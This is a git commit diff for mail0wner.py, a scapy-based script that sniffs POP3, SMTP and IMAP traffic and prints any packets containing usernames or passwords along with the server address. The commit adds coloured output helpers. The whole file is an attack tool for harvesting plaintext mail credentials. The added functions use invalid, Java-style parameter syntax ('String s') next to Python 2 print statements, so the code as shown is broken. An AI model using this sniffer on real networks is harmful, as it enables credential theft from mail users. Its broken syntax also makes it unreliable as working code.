be7d891a7fece486242563473a3014130ca22739
thecarterb <cbawsome77@gmail.com>
2016-11-08 14:11:39 -0500

    add color support

--- mail0wner.py
+++ mail0wner.py
@@ -5,7 +5,7 @@ logging.captureWarnings(True)
 from scapy.all import *
 import time
 from optparse import OptionParser
-#supress annoying scapy IPv6 warnings
+#supress annoying scapy warnings
 import requests.packages.urllib3
 import requests.packages.urllib3
 requests.packages.urllib3.disable_warnings()
@@ -18,24 +18,35 @@ if len(args) < 2:
     interface = options.iface
     time = options.time
 
+OK_GREEN = "\033[92m"
+OK_BLUE = "\033[94m"
+WARNING = "\033[93m"
+ENDC = "\033[0m"
+
+#handle colors
+def printMsg(String s):
+    print(OK_BLUE + "[*]" + ENDC + " " + s)
+def printGood(String s):
+    print(OK_GREEN + "[*]" + ENDC + " " + s)
+def printErr(String s):
+    print(WARNING + "[!]" + ENDC + " " + s)
 
 #packet callback
 def packet_callback(packet):
     if packet[TCP].payload:
         mail_packet = str(packet[TCP].payload)
         if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
-            print "[*] Server: %s" % packet[IP].dst
-            print "[*] %s" % packet[TCP].payload
-
+            printGood("Server: %s" % packet[IP].dst)
+            printGood("%s" % packet[TCP].payload)
 try:
-
-    print('[*] Running for %i seconds...' % options.time)
+    printMsg("Running for %i seconds..." % options.time)
     #start sniffer
     sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=time, iface=interface)
     #port 110 = POP3
     #port 143 = IMAP
     #port 25  = SMTP
-    print("[!] Scanner has finished after %i seconds." % options.time)
+    printMsg("Scanner has finished after %i seconds." % options.time)
+    exit(0)
 except OSError as e: #catch unknown interface OSError
-    print "Unknown interface: %s" % options.iface
-exit(0)
+    printErr("Unknown interface: %s. (use the -i switch to specify an interface)" % options.iface)
+    exit(1)
